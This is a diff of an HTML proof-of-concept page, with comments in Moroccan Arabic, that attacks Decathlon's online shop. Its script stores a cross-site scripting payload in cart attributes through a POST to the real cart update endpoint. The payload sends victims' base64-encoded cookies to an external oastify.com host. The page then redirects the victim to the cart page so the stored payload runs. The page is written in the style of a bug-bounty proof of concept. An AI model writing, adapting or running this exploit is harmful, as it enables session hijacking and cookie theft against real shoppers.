@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - Stored XSS via Cart Attributes</title>
+    <title>PoC - Final Decathlon Exploit</title>
 </head>
 <body>
     <h1>Processing Decathlon Cart...</h1>
     <script>
-        // هاد الكود غايصيفط الـ Payload لـ السيرفر ديال Decathlon ويخزنو فـ الـ Cart
-        const payload = "<script>fetch('https://r3v1ry3bzrbj60agdaqj7bf2ftlk9gx5.oastify.com/?exfil=' + btoa(document.cookie))<\/script>";
+        // هاد الكود غايخزن الـ Payload فـ السيرفر ديال Decathlon
+        const exfilUrl = "https://r3v1ry3bzrbj60agdaqj7bf2ftlk9gx5.oastify.com/?exfil=";
+        const xssPayload = "<script>fetch('" + exfilUrl + "' + btoa(document.cookie))<\/script>";
         
+        // إرسال الـ Payload لـ السيرفر
         fetch("https://www.decathlon.com/cart/update.js", {
             method: "POST",
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-            },
-            body: "attributes[_source]=Rebuy" + encodeURIComponent(payload) + "&attributes[_attribution]=Smart Cart 2.0"
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "attributes[_source]=Rebuy" + encodeURIComponent(xssPayload) + "&attributes[_attribution]=Smart Cart 2.0"
         })
         .then(() => {
-            // مورا ما يتخزن الـ Payload، غانصيفطو الضحية لـ صفحة الـ Cart باش يتنفذ الكود
+            // الضربة القاضية: غانصيفطو الضحية لـ الصفحة فين كيتنفذ الكود المخزن
             window.location.href = "https://www.decathlon.com/cart";
         });
     </script>
